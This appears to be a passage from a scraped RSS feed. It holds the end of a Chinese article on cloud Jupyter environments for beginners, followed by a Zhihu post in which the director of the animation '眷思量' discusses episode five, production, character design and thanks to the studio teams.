src=\"https://cdn.sspai.com/2021/07/03/12e9cbf52d4ab5b0d377da5cad66b62a.png\"></figure><p>虽然菜鸟教程上的知识可能有一部分不完全是最新的，但对于想要入门的新手来说基础的一些知识也需要花上一段时间去好好消化了。</p>\n<h2>数据科学：万物基于 Jupyter</h2>\n<p>对于一些想要学像数据分析、数据挖掘、机器学习或是深度学习这样数据科学领域技能的朋友来说，除了需要具备一些数理统计知识外，还可能需要通过代码来实践或验证理论想法。</p>\n<p>因此像 Python、R 语言或 Julia 这样能将理论和实践连接到一起的脚本式编程语言往往比较被这部分人群所偏好。</p>\n<p>在实践的过程中，我们会随时随地想要输出经过代码处理后得到数据或是图表的结果，并根据结果形成基本的结论或是报告。而这样能将代码、结果和文字结论组合到一块并被广泛使用的是一个名为 Jupyter Notebook 的东西。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/03/726f229cd2929ea7e129c53e2cf2fa15.png\"><figcaption>图源 <a href=\"https://jupyter.org/\" target=\"_blank\">Jupyter 官网</a></figcaption></figure><p>Jupyter Notebook 是 <a href=\"https://jupyter.org/\">Jupyter</a> 开源项目中的一块核心部分，而该项目旨在横跨数十种语言提供<strong>交互式计算</strong>，以便能更好的进行开源软件、标准或是服务的开发。</p>\n<p>早在以前我就写过关于 Jupyter Notebook 的相关内容（<a href=\"https://sspai.com/post/55402\">在线的 Jupyter Notebook 云环境</a>）。但对于初学者而言，我们不一定要按照官网那样，去自己搭建一个用于学习或练习的编程环境，因为毕竟我们本身直接就可以通过既有的云环境来进行练习。</p>\n<p>国内比较知名的几个：</p>\n<ul>\n<li>\n<a href=\"https://www.heywhale.com/about\">科赛和鲸</a>（目前已改名为和鲸）</li>\n<li><a href=\"https://tianchi.aliyun.com/\">阿里天池</a></li>\n<li><a href=\"https://www.datafountain.cn/\">DataFountain</a></li>\n<li><a href=\"https://aistudio.baidu.com/\">百度飞浆 AI Studio</a></li>\n</ul>\n<p>而国外我有使用过的主要就是：</p>\n<ul>\n<li><a href=\"https://www.kaggle.com/\">Kaggle</a></li>\n<li><a href=\"https://colab.research.google.com/\">Google Colab</a></li>\n</ul>\n<p>但不论是国内还是国外的平台，大部分都和 Jupyter Notebook 的布局和使用方法大同小异，或者说大部分都是基于 Jupyter 进行二次开发。</p>\n<p>除此之外，这些平台本质上是为数据竞赛而生的，所以我们既能在这些平台上进行学习、练习，也能看到别人在不同比赛中的思路、代码案例，甚至我们也可以亲自参与平台上的数据竞赛，没准最后还能获得丰厚的奖金以及大厂 Offer。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/03/d6106d5779989ea263e463309549e29d.png\"></figure><p>如果只是入门数据分析、数据挖掘或是机器学习（不涉及 GPU），那么使用哪个平台进行 Coding 都无可厚非；如果是涉及到 GPU 以及深度学习这类需要借助显卡算力的学习，那么我上述所列的平台里，据我所知可能只有百度飞桨、Kaggle 和 Google Colab 三个平台支持。</p>\n<p>但因受限于<strong>网络原因</strong>，后两个平台我们可能不一定有机会使用到，但<strong>百度飞桨</strong>提供免费限时的 GPU 算力，对于 AI 初学者或爱好者来说，无疑是个值得一薅的「羊毛」。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/03/a51b3da2d7758a8a715a42f59cdcc997.png\"></figure><h2>结尾</h2>\n<p>除了文中提到的平台，目前仍有「开箱即用」的编程环境，对于初学者来说无疑是个提高学习效率或保持编程热情的解决方案。</p>\n<p>但这些编程环境并不是完美的，也不一定和我们实际写代码的场景相吻合。从知识体系的完整性层面上来说，当初学者已经真正入门或掌握某种编程语言或框架时，依然需要重新熟悉一下如何搭建一个编程环境，这样才更加贴合实际的编程实践。</p>\n","link":"https://sspai.com/post/67541"},{"title":"如何评价动画《眷思量》第五集？","date":"2021-07-07 04:00:11","description":"\n<p>大家好，这次非常感谢知乎的邀请，经过深度了解，发现知乎是一群有思想有态度的年轻人经常聚集交流的平台。感觉能让我这个很少上网冲浪的老人家跟年轻人又近了一步~但是初次上来非常非常紧张，为了备稿失眠了，首分享不知道该说啥好，就先跟大家先聊聊最近的心情和感受吧。   </p>\n<p><img src=\"https://pic3.zhimg.com/v2-4ff91f0924f67819391d215a726ece7f_720w.jpg?rss\" data-rawwidth=\"770\" data-rawheight=\"1365\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-4ff91f0924f67819391d215a726ece7f\" data-watermark-src=\"v2-d4e48baecbf066026353ba24b5d68d24\" data-private-watermark-src=\"v2-19bfb76956873f55eb05b4f4563cb4d3\"></p>\n<p>这周一，《眷思量》第五集终于上线，且传来破亿喜讯，恍惚中还是十分开心，其实我从6月14号首播当天，到今天，这段时间仍旧深陷在最后几集高潮戏的紧张赶制中。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-262b3109f614d85df38a57bf69b61515_720w.jpg?rss\" data-rawwidth=\"960\" data-rawheight=\"720\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-262b3109f614d85df38a57bf69b61515\" data-watermark-src=\"v2-8822564c81051ac66b445d01abb28501\" data-private-watermark-src=\"v2-7dff08c20aa9d3f703c1b40a90e4be0e\"></p>\n<p>和没上线前不一样的就是，每天还需要应对一大堆宣发物料的制作和审核，以及随时会来的合作洽谈和访谈准备等，所以前几周一直没什么时间上线跟观众朋友们多做交流，因为如果在公司见识过我工作状态和排队审核状态的人就知道，小伙伴们很多人加班到很晚，为了每天早点下班回家，排队等反馈的人的眼神能把其他插队的人生吞活剥=v=。</p>\n<p>我就比他们幸运多了～我不用走下班回家这个流程，我就住在公司阁楼，下楼就上班，上楼就躺倒。。。3年来生活就是工作，工作也是生活，无缝衔接。。。。。。嗯，是幸福的！</p>\n<p><img src=\"https://pic3.zhimg.com/v2-e1879b9f41c6eba70a9c68cac7d591bd_720w.jpg?rss\" data-rawwidth=\"960\" data-rawheight=\"720\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-e1879b9f41c6eba70a9c68cac7d591bd\" data-watermark-src=\"v2-efebadafe6c45a2961ea1e4e7ea5a15a\" data-private-watermark-src=\"v2-1b20342ba1ed8867da47981993729666\"></p>\n<p>之前幻想上线的时候应该会轻松些了吧，没想到真的到了这个阶段却是没上线前成倍的忙，以至于最近更晕头转向了，大概是我太吹毛求疵了，很多细节不磨到位就不肯罢休，也许草草收了尾，赶紧杀青，就不会像现在这样连轴转都转不过来了。但……那就不是我了。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-43de09b692fb1330520b2eda7d2d649f_720w.jpg?rss\" data-rawwidth=\"1178\" data-rawheight=\"777\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-43de09b692fb1330520b2eda7d2d649f\" data-watermark-src=\"v2-45f2975a595d090b88f6afa81fef11cb\" data-private-watermark-src=\"v2-2c86b8e18109e5fe83383f2c9d4977d8\"></p>\n<p>前几周赶各环节反馈加上其他方面的工作量爆发，导致睡眠时间严重缩减到破纪录，最夸张的一天，睡了1个半小时爬起来，然后第二天，睡了3个半小时，两天，48小时，睡眠时间5小时，其他时间就像机器一样，白天跟各组人轮番交流推进度，晚上不断处理着各种反馈。第三天实在扛不住，才强制自己切断工作多睡几个小时。我相信自己能扛过去，一如每次遇到制作上的坎坷，都坚持着咬牙扛过来一样，因为我的背后还有很多各环节、各公司的小伙伴们支撑着我，他们都和我一样，想做一部好看的片子，跟有共同的目标的人们一起共事，让我无比欣慰也感觉充满力量。</p>\n<p>看到大家心疼我最近通宵很多，有留言说可以不那么辛苦，可以等等眷眷，会心一笑的同时，觉得确实，留得青山在不怕没柴烧，我是应该好好规划下工作强度和分工分担的问题了，但先把这一季扛完吧！</p>\n<p>《眷思量》是我从年少时起就一直做的一个梦。占据了我整个青春期的懵懂悸动和期许，我觉得自己属于很幸运的那种，眷眷不忘，果然必有回响，如今，我终于有机会让眷眷在你们面前徐徐展开，让你们看看我脑海中光怪陆离的东方幻想世界。以及一个个魂牵梦萦、美不胜收的美人们的具体样子。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-68099d8102d55c2463b60bd3b10135e6_720w.jpg?rss\" data-rawwidth=\"1914\" data-rawheight=\"1074\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-68099d8102d55c2463b60bd3b10135e6\" data-watermark-src=\"v2-61da933fd2e72145546129ac4280a07f\" data-private-watermark-src=\"v2-a747c00dab9d5106ff8404bf0d555f21\"></p>\n<p>初次有机会将自己儿时的梦实现，我无比珍惜这个机会，因为作为在行业摸爬滚打的从业人士，太明白这个机会代表了什么，也明白如果不把握好，这辈子可能没有第二次机会了。</p>\n<p>所以，在《眷思量》里，我加入了很多一直很想尝试的思路。</p>\n<p>比如关于人物的刻画展现。我希望大家看到这些角色的时候可以感受到他们所处的身份地位、状态人物性格等，而不是只能通过旁白或剧情的介绍，这样他们表演起来，大家更能感同身受他们的状态。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-0bee574fc367af3081f8b92b62e54b48_720w.jpg?rss\" data-rawwidth=\"1920\" data-rawheight=\"1080\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-0bee574fc367af3081f8b92b62e54b48\" data-watermark-src=\"v2-d44daf740c6bc7238bdbc95f9bbc4a53\" data-private-watermark-src=\"v2-7c3a13bbd280d214700c8b7b73d8104d\"></p>\n<p><br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-c47d965bfa910f9ffcab5aa1ef47ef19_720w.jpg?rss\" data-rawwidth=\"1919\" data-rawheight=\"1080\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-c47d965bfa910f9ffcab5aa1ef47ef19\" data-watermark-src=\"v2-b6b224d39021621322224e8f159e4dc2\" data-private-watermark-src=\"v2-360e65b8866edd28ee7b9ab4c57a870d\"></p>\n<p><br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-416e62be0de140797d32dbc68e14ecd3_720w.jpg?rss\" data-rawwidth=\"1850\" data-rawheight=\"1016\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-416e62be0de140797d32dbc68e14ecd3\" data-watermark-src=\"v2-ed3f990fa882bc4607db310fd1c2f758\" data-private-watermark-src=\"v2-ce7b9ad0d839ff22996aa2e4edeaba32\"></p>\n<p>以及角色和角色之间的关系可以通过他们的长相就看出来。</p>\n<p>比如小镜玄到大镜玄是真的成长起来的模样。我不标注大家也能看出是他小时候。片中的孩子都是用这种方式来建模的。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-b3caa00e2bd18042e714ff20ec1a90bc_720w.jpg?rss\" data-rawwidth=\"1919\" data-rawheight=\"1080\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-b3caa00e2bd18042e714ff20ec1a90bc\" data-watermark-src=\"v2-8978fa402ad5d22dc7eb6d050db119fa\" data-private-watermark-src=\"v2-24db6cb167e1316590f0928e0b3af83d\"></p>\n<p><br></p>\n<p><img src=\"https://pic1.zhimg.com/v2-713b2c6af3ffb1355e72e34440632372_720w.jpg?rss\" data-rawwidth=\"1926\" data-rawheight=\"1085\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-713b2c6af3ffb1355e72e34440632372\" data-watermark-src=\"v2-f8358988044d645cc0f8a296f18eb535\" data-private-watermark-src=\"v2-d60fb592382c05e9f131fb952cce9017\"></p>\n<p><br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-c475dbb6b33b305d96a1727d9a17fee1_720w.jpg?rss\" data-rawwidth=\"1920\" data-rawheight=\"1080\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-c475dbb6b33b305d96a1727d9a17fee1\" data-watermark-src=\"v2-5ffffa3437c78a21e3068f6981704677\" data-private-watermark-src=\"v2-95f7e5280a20eba9902c086c419bfa6b\"></p>\n<p>再比如程染、程熔和两个儿子是真的在遗传学上有继承的五官特征等等。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-f2e4ee60c810a41bc731d8b4df1f8a82_720w.jpg?rss\" data-rawwidth=\"1937\" data-rawheight=\"1083\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-f2e4ee60c810a41bc731d8b4df1f8a82\" data-watermark-src=\"v2-28556adb4108df135d2192ef99f5a0d6\" data-private-watermark-src=\"v2-bba9cff5fb6024221ca6025f05e71125\"></p>\n<p><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-caad8ebafdccf9622b310a835b465710_720w.jpg?rss\" data-rawwidth=\"1920\" data-rawheight=\"1078\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-caad8ebafdccf9622b310a835b465710\" data-watermark-src=\"v2-7163c43e6b21fe527f465b8b44fc0a0e\" data-private-watermark-src=\"v2-1c650815dcc131c7be829a0c1e274405\"></p>\n<p><br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-cae63ec4269943df6e1380bb2cc365b6_720w.jpg?rss\" data-rawwidth=\"1920\" data-rawheight=\"1078\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-cae63ec4269943df6e1380bb2cc365b6\" data-watermark-src=\"v2-e4f2d01a29aec8cd9bfe0e6b9662b291\" data-private-watermark-src=\"v2-4ae27a63affc073a0b1e4bac32d99866\"></p>\n<p><br></p>\n<p><img src=\"https://pic1.zhimg.com/v2-dbbf57a8f020f6acd68af90893e0b2f0_720w.jpg?rss\" data-rawwidth=\"1911\" data-rawheight=\"1079\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-dbbf57a8f020f6acd68af90893e0b2f0\" data-watermark-src=\"v2-edee37324a283a5c0e2f5a57f5ce4000\" data-private-watermark-src=\"v2-70c279043cea10a7b0f264597c13922e\"></p>\n<p>所以在创造这些角色的时候，我想通过塑造内在气质和外在形象结合的方式来诠释人物的真实感，再加上每场戏对光影的设计，赋予每个角色更立体的表达。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-4a2f9b2b5d08841c9ca665658fe584dd_720w.jpg?rss\" data-rawwidth=\"1920\" data-rawheight=\"1080\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-4a2f9b2b5d08841c9ca665658fe584dd\" data-watermark-src=\"v2-71e4c8d6cc7e8e79f0bacb5a65039341\" data-private-watermark-src=\"v2-a1b13fbba49e999a9a19ad5ca6de5617\"></p>\n<p><br></p>\n<p><img src=\"https://pic1.zhimg.com/v2-27b87c91d50486c36925482b51a94992_720w.jpg?rss\" data-rawwidth=\"1920\" data-rawheight=\"1080\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-27b87c91d50486c36925482b51a94992\" data-watermark-src=\"v2-3873bd9962c173fdf63d63a3447058f6\" data-private-watermark-src=\"v2-f6bb3d6e62039c388d427fadd54bbb7c\"></p>\n<p><br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-68f84222b10d5bc3ece3e127e3bcd568_720w.jpg?rss\" data-rawwidth=\"1920\" data-rawheight=\"1080\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-68f84222b10d5bc3ece3e127e3bcd568\" data-watermark-src=\"v2-0df87a04e07b76475e8ee56d0f050b16\" data-private-watermark-src=\"v2-6df8d2d7ce9c8d025ba92444b28c5e4b\"></p>\n<p><br></p>\n<p><img src=\"https://pic1.zhimg.com/v2-2916f20cb31f206abf8033c9887d811e_720w.jpg?rss\" data-rawwidth=\"1920\" data-rawheight=\"1080\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-2916f20cb31f206abf8033c9887d811e\" data-watermark-src=\"v2-23239cf11c26303768da70b101342dec\" data-private-watermark-src=\"v2-04503e5b66f936e28388d83b1cd1b54b\"></p>\n<p>再比如关于场景的创意思路，眷思量这个故事我想表达的是一个富有东方美学的架空幻想故事，所以场景首先要体现出中式的美感和风骨，但又不是真正的现实朝代感，所以我在影片中就尝试建立了一种新中式美学的思路，让建筑既有古意，又不同于实际的古代建筑本身。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-6b13fc48e7e4576a2d78b86d197db2d6_720w.jpg?rss\" data-rawwidth=\"1920\" data-rawheight=\"1080\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-6b13fc48e7e4576a2d78b86d197db2d6\" data-watermark-src=\"v2-73011cbc1ae854fe18485320291a26c8\" data-private-watermark-src=\"v2-fcbf8fc0d3466184b16f62b311337f2f\"></p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-0c61a2295d4e2bbdab6ffd5146cba6b8_720w.jpg?rss\" data-rawwidth=\"1920\" data-rawheight=\"1080\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-0c61a2295d4e2bbdab6ffd5146cba6b8\" data-watermark-src=\"v2-f3f064cd38ee7cd5190bb2bf34c36180\" data-private-watermark-src=\"v2-29f719c39e8cb5067cdb8943581d1e36\"></p>\n<p><br></p>\n<p><img src=\"https://pic1.zhimg.com/v2-81086387d2ea9b766aac09562f49897b_720w.jpg?rss\" data-rawwidth=\"2000\" data-rawheight=\"1126\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-81086387d2ea9b766aac09562f49897b\" data-watermark-src=\"v2-aa919ba8a640da6bbab3ea7fa0f598ee\" data-private-watermark-src=\"v2-e7e40f6d5f682c5ea4e2fef8e12b274b\"></p>\n<p>其中藏典阁和议事堂这两座岛上代表建筑都是带有这种思路的神迹建筑设计。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-357128375a3eca820ea100bd6d7b966a_720w.jpg?rss\" data-rawwidth=\"1923\" data-rawheight=\"1083\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-357128375a3eca820ea100bd6d7b966a\" data-watermark-src=\"v2-4ab7423a46db12545f27e1ae94b68723\" data-private-watermark-src=\"v2-d56250ba4eb9825cff8e441a7700b5fb\"></p>\n<p><br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-5dd6f33de1f94e7b026192004d94bfaa_720w.jpg?rss\" data-rawwidth=\"1840\" data-rawheight=\"1035\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-5dd6f33de1f94e7b026192004d94bfaa\" data-watermark-src=\"v2-0944e487093eba1143b5dcd77c705d7b\" data-private-watermark-src=\"v2-529aee02f1729fe05927cadfa550f9ed\"></p>\n<p>以上这些，大家在播出的影片中如果能感受到一些我就很欣慰了。</p>\n<p>从播之前忐忑的想知道大家的反应，到上线后被迫忙的焦头烂额顾不上了解，再到如今制作的工作正逐渐收尾，开始陆续回应多方的关注和交流。也很感谢知乎这次邀请我来跟大家好好交流一下。我就借这次机会说明下关于剧本身我的一些初始想法吧。</p>\n<p>1，先说说关于《眷思量》的主线剧情。虽然我之前都说过，但可能很多人还是没有看到，于是刚好在大知乎也说下！</p>\n<p>在我心中，这是一部全员搞事业的剧，爱情是辅助，而且里面还有亲情和友情等美好的情感。所以并不会从事业番忽然变成纯恋爱番哦。想看恋爱的大家多多二创吧～我也很期待看到大家发挥～</p>\n<p>就像《柯南》主线是断案，《棋魂》主线是围棋，《眷思量》的主线是讲述岛上以男女主为代表视角的一群年轻人如何突破枷锁寻找心中自由的故事。且感情设置都是1V1，不分叉不开后宫，谢谢！</p>\n<p>可能因为我心里这些角色都很美，可以说是个全员美人的颜番了，谁让我是个会建模的终极颜狗呢=v=。。。。，这个优势不充分利用下我怎能甘心，于是我也尽量在把美感做到我想要的程度。以及后续还会有我心中其他类型的极品美帅酷的角色登场，当然，前提是如果能继续往下做的话。。。。。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-a4d5ca4a1ae6175cb2771cf061da5d8c_720w.jpg?rss\" data-rawwidth=\"960\" data-rawheight=\"840\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-a4d5ca4a1ae6175cb2771cf061da5d8c\" data-watermark-src=\"v2-d88fbe8fff2a361485846edc1f7496a5\" data-private-watermark-src=\"v2-f36e55826343a98fbe73c7101cfd5676\"></p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-7704cd69e702c6cc14058cf30ee88b25_720w.jpg?rss\" data-rawwidth=\"960\" data-rawheight=\"889\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-7704cd69e702c6cc14058cf30ee88b25\" data-watermark-src=\"v2-451bac8031e0b2480d229675568357d8\" data-private-watermark-src=\"v2-e1072c3a7f91f7bcd6615e5819d5d970\"></p>\n<p><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-4f231adc612eb9133c086851f7bcae2b_720w.jpg?rss\" data-rawwidth=\"960\" data-rawheight=\"669\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-4f231adc612eb9133c086851f7bcae2b\" data-watermark-src=\"v2-5e3d36a7074e6493a34de6c6157b7c19\" data-private-watermark-src=\"v2-331d26fe60fa288d152dab8bf24d1a6a\"></p>\n<p><br></p>\n<p><img src=\"https://pic1.zhimg.com/v2-fc30fa01dc933529351b49a141d477ed_720w.jpg?rss\" data-rawwidth=\"960\" data-rawheight=\"552\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-fc30fa01dc933529351b49a141d477ed\" data-watermark-src=\"v2-0584282a79d6362a9a69dbe3f19b1bb7\" data-private-watermark-src=\"v2-b88a0ab7f1c5e369d4ed22126f68d490\"></p>\n<p>所以大家看到漂亮角色可能都会有磕CP啊拉郎啊之类的想法，这我能理解，也拦不住，但希望大家和和气气快快乐乐地磕，圈地自萌，不要因此产生无谓的纷争。</p>\n<p><br></p>\n<p>2，关于某些观众可能误会这是一部大女主剧的问题，从19年到21年，我也是通过各种自己能接触到的渠道重申多次。思量这部剧不是大女主剧，男女主都是重要的表达视角。</p>\n<p>以及因为角色的制作先后顺序不同，所以露面的前后顺序也不一样。可能导致有了解不全的人误解了。在这里也说明一下。</p>\n<p>眷眷的每个角色对我来说都是独一无二的，对故事都很重要。他们的出场是服从剧情的安排，在正片里的出现都是为推动剧情的发展。</p>\n<p>而在主线故事之外，我也给某些角色写过专属番外，如果以后时机成熟，可以看大家诉求，再决定是否为某个角色量身打造番外篇。</p>\n<p>我做眷眷的初衷就是把我脑海里这个原型故事完整表达好，每个绝美的人物都塑造好，他们在其中都很优秀，有各自的作用。只要大家还喜欢看，只要公司能维持正向运转，我会尽我所能一直做下去直到大结局的。</p>\n<p>3，然后来聊聊思量初相见时期的故事吧，因为很多人是开播后才注意到有思量这部剧的，所以难免对此充满疑惑。</p>\n<p>眷思量开始启动之初，面临一个很现实很残酷的问题：这是一个原创作品，无IP支持，无成熟商业模式，各方都在观望，我必须拿出东西来说服更多的人来支持这个项目。</p>\n<p>所以我决定先做一个眷思量的概念PV，让别人能以最直观的方式看到我脑海里的东西。</p>\n<p>在选择PV出场角色的时候，我选择了奉眠。之所以选择眠眠有两个原因：</p>\n<p>      1，我之前微博提过，因为她是思量故事里，第一个以神族身份和形态登场的角色，其他角色第一季的时候都苦哈哈的在思量岛渡劫。只有眠眠初登场就一直持续着她神秘华丽高贵的样子。我觉得是个可以说明我思量整体视觉调性的角色。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-6b1f2d509d3cf7b07baacd493f42a042_720w.jpg?rss\" data-rawwidth=\"2048\" data-rawheight=\"1407\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-6b1f2d509d3cf7b07baacd493f42a042\" data-watermark-src=\"v2-c3251d68533e541455a7e4c953412e8e\" data-private-watermark-src=\"v2-3692f8f0c94014bf0b2a90ec0c22e304\"></p>\n<p><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-63a9e5096431ab5e2042c5bcf6aaf148_720w.jpg?rss\" data-rawwidth=\"1784\" data-rawheight=\"1000\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-63a9e5096431ab5e2042c5bcf6aaf148\" data-watermark-src=\"v2-f6e29f32b4c543dd226035622eb03b73\" data-private-watermark-src=\"v2-ae915d4b83dd2b60dd235bf074e0b5ee\"></p>\n<p>        2，主角在我开始动手做PV的当时，模型材质还没完全做完，但很多人着急看效果，项目已经不能等了。而且眠眠可以充分展示我们项目在模型方面的技术水平。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-146c920eb20052e6f86d5a626b3c1ee4_720w.jpg?rss\" data-rawwidth=\"1700\" data-rawheight=\"718\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-146c920eb20052e6f86d5a626b3c1ee4\" data-watermark-src=\"v2-5670fa87e67affbafdf0840bb95939a8\" data-private-watermark-src=\"v2-dcf7b89d7b66f49a49e9f25012bf6899\"></p>\n<p><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-f07c110c438f59c5fb1eba0390ae124c_720w.jpg?rss\" data-rawwidth=\"1725\" data-rawheight=\"723\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-f07c110c438f59c5fb1eba0390ae124c\" data-watermark-src=\"v2-1ba6a7d996edd81609a81e80b1621275\" data-private-watermark-src=\"v2-3c772aad271b608f8bb817aa6efd5968\"></p>\n<p>2019年3月，我们上线的第一支PV。这支PV在微博和B站皆获得了过百万的播放量，收获了热烈的反馈，增加了各方的信心，也让我有了足够的支持把思量这个项目继续下去。</p>\n<p>当然以上这只是我在做思量时遇到的无数难关之一，而直到此时，我也不知道能不能继续把思量做完。让大家完完整整看到这个故事。</p>\n<p>但不管如何，在眷思量小有成绩之际，我要感谢很多人~</p>\n<p><br></p>\n<p>首先是我们炎央文化可爱的小伙伴们！他们中很多人怀抱着对我的信任，已经陪我走过了三年四年的时间，每个人都对作品付出了大量的心血。炎央文化的主创团队是眷思量这个作品的创作核心。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-6f486ca8e6ff713dd92511e4c7a92879_720w.jpeg?rss\" data-rawwidth=\"1619\" data-rawheight=\"1180\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-6f486ca8e6ff713dd92511e4c7a92879\" data-watermark-src=\"v2-819ead9a42558832b7094143d7507b7a\" data-private-watermark-src=\"v2-b49b649c6d7976f0726b310c6ebeeea0\"></p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-5bdef594a4c58c8661cb0b29bd5e6a04_720w.jpg?rss\" data-rawwidth=\"1896\" data-rawheight=\"1711\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-5bdef594a4c58c8661cb0b29bd5e6a04\" data-watermark-src=\"v2-982dc84b37739a70a30f01737f8febe2\" data-private-watermark-src=\"v2-e134fb6b7801c212f0803b7024e0f3de\"></p>\n<p><br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-e4d03f5115799ebe9c0c641adec86f4c_720w.jpg?rss\" data-rawwidth=\"2135\" data-rawheight=\"859\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-e4d03f5115799ebe9c0c641adec86f4c\" data-watermark-src=\"v2-1c95e1f1566877e9ae4e3b32d50cbb49\" data-private-watermark-src=\"v2-930ba25728c21932f2188fe405c0f61c\"></p>\n<p><br></p>\n<p><img src=\"https://pic1.zhimg.com/v2-97d907a0e33f845658f0869b51908a02_720w.jpg?rss\" data-rawwidth=\"1280\" data-rawheight=\"2555\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-97d907a0e33f845658f0869b51908a02\" data-watermark-src=\"v2-82bdb1b8ed1cddefb2e13c892b34e778\" data-private-watermark-src=\"v2-f123969269bf113cbefc16bcf621e226\"></p>\n<p>编剧组的朋友陪我研究剧本，梳理原著内容逻辑，跨年时还开编剧会到深夜，讨论的乐此不疲。</p>\n<p>制片组的小可爱们细心梳思量每个制作环节的每个细节，事无巨细的盯紧各方面进度，奋战在进度第一线协调各公司，努力保证项目推进效率。</p>\n<p>美术组的小伙伴们配合我一遍遍出服饰构思图，只为接近最贴合原著的角色身份和设计思路。在我选定后又精心绘制服装拆解图，供中期的小伙伴能看明白创意细节才好执行成模型。</p>\n<p>分镜组的小伙伴们在我每次讲戏、分解镜头思路后都快速积极的调整串联，只为达到画面顺畅叙事清晰，让每个角色都有最合适的亮相和剧情情节空间展现他们的喜怒哀乐。</p>\n<p>执行导演们负责将我对每集每个镜头的各种细节想法事无巨细的还原实施到影片中。对镜头、动画、解算等串联把控都非常尽心尽力。对音乐音效的编排创意也都非常有独到见解。剪辑节奏把控也深得我心～</p>\n<p>还要特别感谢吾立方动画的诸位老铁们！！我和吾立方的胡总渊源颇深，一直是业内互相欣赏、守望相助的动画友人，终于在《少锦》时正式开启合作，并通过通力合作建立了更加深的了解和相互信任，深知他们是一个踏实、负责、专业的团队。因此做《眷思量》的时候，第一时间邀胡总一起合作。</p>\n<p>模型组的小伙伴经常陪我加班到深夜雕模型，我多次龟毛的调整要求他们都没有不耐烦，才让资产能有这样协同统一。</p>\n<p>动画组的小伙伴对我零零碎碎的小要求都尽心尽力完成好，让角色动作真的靠近我心里想的样子。</p>\n<p>灯光组的小伙伴对我们非番剧打光级别的要求和一堆反馈回去的灯光设计图，都有努力执行并且保质保量让人欣喜。</p>\n<p>合成组的小伙伴对素材整合协调，我知道一个特效镜头素材动辄十几个G或者几十个G的文件你们肯定很头痛，但从不跟我抱怨。</p>\n<p>我在工作中的确龟毛要求高，但吾立方各组的小伙伴们都在努力配合我协助完成眷思量的各种环节，真的很感谢吾立方对于炎央文化和眷眷的支持！</p>\n<p><img src=\"https://pic1.zhimg.com/v2-f4bf572a9192666641411d3857060570_720w.jpg?rss\" data-rawwidth=\"960\" data-rawheight=\"720\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-f4bf572a9192666641411d3857060570\" data-watermark-src=\"v2-04742be326a8181420eba6076f81c898\" data-private-watermark-src=\"v2-3bb6ae9575e02cf6188a70967e765a87\"></p>\n<p><br></p>\n<p><img 